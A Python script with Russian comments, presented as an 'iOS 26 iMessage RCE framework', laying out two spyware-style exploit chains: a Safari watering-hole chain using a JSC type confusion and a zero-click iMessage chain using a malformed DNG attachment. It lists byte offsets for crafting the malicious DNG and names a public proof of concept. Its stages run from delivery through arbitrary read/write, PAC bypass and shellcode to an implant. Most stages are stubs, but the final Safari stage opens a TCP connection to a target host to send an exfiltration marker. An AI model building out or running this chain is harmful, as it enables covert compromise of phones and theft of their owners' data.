#!/usr/bin/env python3
"""ios26_imessage_rce.py — framework: iMessage -> IMAgent -> WebKit/JSC RCE (iOS 26).

Направление A (Coruna/cassowary) — ИСТОРИЧЕСКИЙ МАТЕРИАЛ (iOS 16.6–17.2.1).
Цель: исследовать ВСЕ исходники и патчи, составить harness, "угадать" патч
(pre-patch поведение) и построить на него атаку.

Цепочка (Вектор A — Safari/Coruna):
  1. Safari iframe (watering hole) → WebKit (WebKit2)
  2. WebKit-escape: type confusion в JSC DFG JIT (CVE-2024-23222 cassowary)
  3. OOB read/write -> arbitrary R/W -> code patching
  4. Shellcode -> exfil / implant

Цепочка (Вектор Б — iMessage zero-click, НОВЫЙ КАНДИДАТ):
  1. iMessage DNG-attachment (0-click, без tap)
  2. iMessage-демон (imagent/IMTranscoderAgent) → RawCamera.bundle
  3. JPEG Lossless Decompression → OOB write (CVE-2025-43300)
  4. Arbitrary R/W -> RCE

Кандидаты (NVD-верификация 2026-09-03):
  - CVE-2024-23222  (cassowary, DFG tryGetConstantProperty race)  [reference]
  - CVE-2025-43300  (DNG/JPEG OOB write, RawCamera.bundle)       [НОВЫЙ ОСНОВНОЙ]
  - CVE-2023-32434  (kernel integer overflow)                    [исторический]
  - CVE-2025-31205  (WebKit cross-origin exfil)                  [вспомогательный]
  - CVE-2025-43301  (macOS privacy)                              [не подходит]

Использование:
  python3 ios26_imessage_rce.py --dry-run
  python3 ios26_imessage_rce.py --cve CVE-2024-23222 --target 192.168.1.50:9999
  python3 ios26_imessage_rce.py --cve CVE-2025-43300 --dry-run
  python3 ios26_imessage_rce.py --list
"""
import argparse, json, os, sys, time, socket, base64

CANDIDATES = {
    "CVE-2024-23222": {
        "name": "cassowary",
        "component": "JSC DFG: tryGetConstantProperty (CFA vs Constant Folding)",
        "type": "type confusion (race, TOCTOU)",
        "cwe": "CWE-843",
        "cvss": "8.8 (AV:N/AC:L/PR:N/UI:R)",
        "affected": "Safari < 17.3, iOS < 17.2.1, macOS < 14.3.1",
        "patch": "6471469 / 66f60de (Bugzilla 267134)",
        "harness": "cassowary_harness.js",
        "offsets": {"jscell_header": "TODO", "misalign": 0x10},
        "status": "REFERENCE (historical, iOS 16.6-17.2.1)",
        "exploited": "Coruna (NSO), iOS 16.6-17.2.1",
        "click": "1-click (UI:R)",
        "vector": "A (Safari iframe)",
    },
    "CVE-2025-43300": {
        "name": "dng-oob-write",
        "component": "RawCamera.bundle: JPEG Lossless Decompression (DNG)",
        "type": "OOB write (CWE-787)",
        "cwe": "CWE-787",
        "cvss": "10.0 (AV:N/AC:L/PR:N/UI:N, Scope:Changed)",
        "affected": "iOS < 18.6.2, macOS < 15.6.1",
        "patch": "binary diff RawCamera (ipsw 18.6.1 vs 18.6.2): bounds check output ptr vs buffer_end, CDNGLosslessJpegUnpacker (Quarkslab)",
        "harness": "DNG (dpreview Pentax K-3 III) + 2 байта: 0x2FD00 01->02 (SamplesPerPixel), 0x3E40B 02->01 (NumComponents SOF3); DNGViewer (CIRawFilter) на macOS 15.6",
        "offsets": {"sof3_component_count": "0x3E40B (02->01)", "subifd_sampleperpixel": "0x2FD00 (01->02)"},
        "status": "НОВЫЙ ОСНОВНОЙ (iMessage zero-click)",
        "exploited": "extremely sophisticated attack (2025)",
        "click": "0-click (UI:N)",
        "vector": "Б (iMessage DNG-attachment)",
        "poc": "b1n4r1b01/n-days (iOS 18.6.1 0-click RCE)",
    },
    "CVE-2023-32434": {
        "name": "kernel-int-overflow",
        "component": "XNU kernel",
        "type": "integer overflow (CWE-190)",
        "cwe": "CWE-190",
        "cvss": "7.8 (AV:L/AC:L/PR:N/UI:R)",
        "affected": "iOS < 15.7.7, < 16.5.1, macOS < 12.6.7, < 13.4.1",
        "patch": "TODO",
        "harness": None,
        "offsets": {},
        "status": "ИСТОРИЧЕСКИЙ (kernel, не WebKit)",
        "exploited": "Да (iOS < 15.7)",
        "click": "1-click (UI:R)",
        "vector": "A (kernel privesc)",
    },
    "CVE-2025-31205": {
        "name": "webkit-cross-origin-exfil",
        "component": "WebKit (Safari)",
        "type": "cross-origin data exfiltration (CWE-352)",
        "cwe": "CWE-352",
        "cvss": "6.5 (AV:N/AC:L/PR:N/UI:R, C:H/I:N/A:N)",
        "affected": "Safari < 18.5, iOS < 18.5, macOS < 15.5",
        "patch": "TODO",
        "harness": None,
        "offsets": {},
        "status": "ВСПОМОГАТЕЛЬНЫЙ (exfil, не RCE)",
        "exploited": "Нет",
        "click": "1-click (UI:R)",
        "vector": "A (Safari)",
    },
    "CVE-2025-43301": {
        "name": "macos-notification-privacy",
        "component": "macOS Notification Center",
        "type": "privacy issue (CWE-359)",
        "cwe": "CWE-359",
        "cvss": "3.3 (AV:L/AC:L/PR:N/UI:R, C:L)",
        "affected": "macOS < 14.8, < 15.7, < 26",
        "patch": "TODO",
        "harness": None,
        "offsets": {},
        "status": "НЕ ПОДХОДИТ (macOS-only, privacy)",
        "exploited": "Нет",
        "click": "1-click (UI:R)",
        "vector": "N/A",
    },
}

# Стадии для Вектора A (Safari/Coruna — cassowary)
STAGES_A = [
    ("stage1_delivery_safari",   "Safari iframe (watering hole)"),
    ("stage2_webkit_inject",     "инжект JS-пейлоада в WebKit (ios26_webkit_hook.js)"),
    ("stage3_trigger_cve",       "триггер WebKit-escape (harness, CVE-2024-23222)"),
    ("stage4_oob_rw",            "OOB read/write -> arbitrary R/W"),
    ("stage5_code_patching",     "code read/write -> RWX (ASLR + PAC bypass)"),
    ("stage6_shellcode",         "shellcode -> implant (powerd/locationd/imagent)"),
    ("stage7_exfil",             "exfil (TCP/ICMP/iMessage C2)"),
]

# Стадии для Вектора Б (iMessage zero-click — CVE-2025-43300)
STAGES_B = [
    ("stage1_delivery_imessage", "iMessage DNG-attachment (0-click, без tap)"),
    ("stage2_imagent_parse",     "imagent/IMTranscoderAgent разбирает DNG"),
    ("stage3_rawcamera_oob",     "JPEG Lossless Decompression -> OOB write (RawCamera.bundle)"),
    ("stage4_arbitrary_rw",      "OOB write -> arbitrary R/W"),
    ("stage5_escalation",        "escalation (sandbox RawCamera.bundle)"),
    ("stage6_escape",            "sandbox escape (TODO)"),
    ("stage7_implant_exfil",     "implant + exfil (TODO)"),
]

def log(msg):
    print(f"[ios26] {msg}")

_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

def load_js(path):
    if path and not os.path.isabs(path):
        path = os.path.join(_SCRIPT_DIR, path)
    try:
        with open(path) as f:
            return f.read()
    except FileNotFoundError:
        return None

def stage1_a(dry):
    log("STAGE 1 (A): Safari delivery (watering hole)")
    if dry: log("  (dry-run) skip iframe injection")

def stage2_a(dry, cve):
    log(f"STAGE 2 (A): WebKit inject (candidate: {cve})")
    js = load_js("ios26_webkit_hook.js")
    log(f"  webkit hook js: {'loaded' if js else 'NOT FOUND (ios26_webkit_hook.js)'}")
    if dry: log("  (dry-run) skip JS payload injection")

def stage3_a(dry, cve, harness_path):
    info = CANDIDATES[cve]
    log(f"STAGE 3 (A): trigger {cve} ({info['name']})")
    log(f"  component: {info['component']}")
    log(f"  type:      {info['type']}")
    log(f"  cvss:      {info['cvss']}")
    log(f"  affected:  {info['affected']}")
    log(f"  patch:     {info['patch']}")
    log(f"  status:    {info['status']}")
    hp = harness_path or info.get("harness")
    js = load_js(hp) if hp else None
    log(f"  harness:   {hp} {'loaded' if js else 'NOT FOUND'}")
    if dry: log("  (dry-run) skip JIT race trigger")

def stage4_a(dry, cve):
    info = CANDIDATES[cve]
    log(f"STAGE 4 (A): OOB R/W (misalign offset: {info['offsets'].get('misalign', 'TODO')})")
    if dry: log("  (dry-run) skip")

def stage5_a(dry):
    log("STAGE 5 (A): code patching (ASLR + PAC bypass + RWX)")
    if dry: log("  (dry-run) skip")

def stage6_a(dry):
    log("STAGE 6 (A): shellcode / implant (powerd/locationd/imagent/SpringBoard)")
    if dry: log("  (dry-run) skip")

def stage7_a(dry, target):
    log(f"STAGE 7 (A): exfil -> {target}")
    if dry:
        log("  (dry-run) skip TCP connect")
        return
    try:
        host, port = target.rsplit(":", 1)
        s = socket.create_connection((host, int(port)), timeout=5)
        s.sendall(b"IOS26-RCE-EXFIL\n")
        log("  exfil channel open")
        s.close()
    except Exception as e:
        log(f"  exfil failed: {e}")

def stage1_b(dry):
    log("STAGE 1 (Б): iMessage DNG-attachment delivery (0-click)")
    if dry: log("  (dry-run) skip iMessage send")

def stage2_b(dry, cve):
    log(f"STAGE 2 (Б): imagent/IMTranscoderAgent parses DNG (candidate: {cve})")
    js = load_js("ios26_imagent_hook.js")
    log(f"  imagent hook js: {'loaded' if js else 'NOT FOUND (ios26_imagent_hook.js)'}")
    if dry: log("  (dry-run) skip DNG parsing")

def stage3_b(dry, cve):
    info = CANDIDATES[cve]
    log(f"STAGE 3 (Б): RawCamera.bundle OOB write ({info['name']})")
    log(f"  component: {info['component']}")
    log(f"  type:      {info['type']}")
    log(f"  cvss:      {info['cvss']}")
    log(f"  affected:  {info['affected']}")
    log(f"  poc:       {info.get('poc', 'TODO')}")
    if dry: log("  (dry-run) skip OOB write trigger")

def stage4_b(dry):
    log("STAGE 4 (Б): arbitrary R/W (from OOB write)")
    if dry: log("  (dry-run) skip")

def stage5_b(dry):
    log("STAGE 5 (Б): escalation (sandbox RawCamera.bundle)")
    if dry: log("  (dry-run) skip")

def stage6_b(dry):
    log("STAGE 6 (Б): sandbox escape (TODO)")
    if dry: log("  (dry-run) skip")

def stage7_b(dry, target):
    log(f"STAGE 7 (Б): implant + exfil -> {target}")
    if dry:
        log("  (dry-run) skip")
        return

def main():
    ap = argparse.ArgumentParser(description="iOS26 iMessage RCE framework")
    ap.add_argument("--cve", default="CVE-2024-23222", choices=list(CANDIDATES), help="candidate CVE")
    ap.add_argument("--vector", default="auto", choices=["auto", "A", "B"], help="attack vector (A=Safari, B=iMessage)")
    ap.add_argument("--harness", default=None, help="путь к JS harness")
    ap.add_argument("--target", default="127.0.0.1:9999", help="exfil target host:port")
    ap.add_argument("--dry-run", action="store_true", help="только план, без действий")
    ap.add_argument("--list", action="store_true", help="список кандидатов")
    args = ap.parse_args()

    if args.list:
        print(json.dumps(CANDIDATES, indent=2, ensure_ascii=False))
        return

    # Определяем вектор
    if args.vector == "auto":
        info = CANDIDATES[args.cve]
        vector = info.get("vector", "A")
        if vector.startswith("Б"):
            vector = "B"
        else:
            vector = "A"
    else:
        vector = args.vector

    log(f"plan: cve={args.cve} vector={vector} target={args.target} dry_run={args.dry_run}")

    if vector == "A":
        log("stages (Вектор A — Safari/Coruna):")
        for i, (sid, desc) in enumerate(STAGES_A, 1):
            log(f"  {i}. {sid}: {desc}")
        log("-" * 60)
        stage1_a(args.dry_run)
        stage2_a(args.dry_run, args.cve)
        stage3_a(args.dry_run, args.cve, args.harness)
        stage4_a(args.dry_run, args.cve)
        stage5_a(args.dry_run)
        stage6_a(args.dry_run)
        stage7_a(args.dry_run, args.target)
    else:
        log("stages (Вектор Б — iMessage zero-click):")
        for i, (sid, desc) in enumerate(STAGES_B, 1):
            log(f"  {i}. {sid}: {desc}")
        log("-" * 60)
        stage1_b(args.dry_run)
        stage2_b(args.dry_run, args.cve)
        stage3_b(args.dry_run, args.cve)
        stage4_b(args.dry_run)
        stage5_b(args.dry_run)
        stage6_b(args.dry_run)
        stage7_b(args.dry_run, args.target)

    log("-" * 60)
    log("done" + (" (dry-run)" if args.dry_run else ""))

if __name__ == "__main__":
    main()
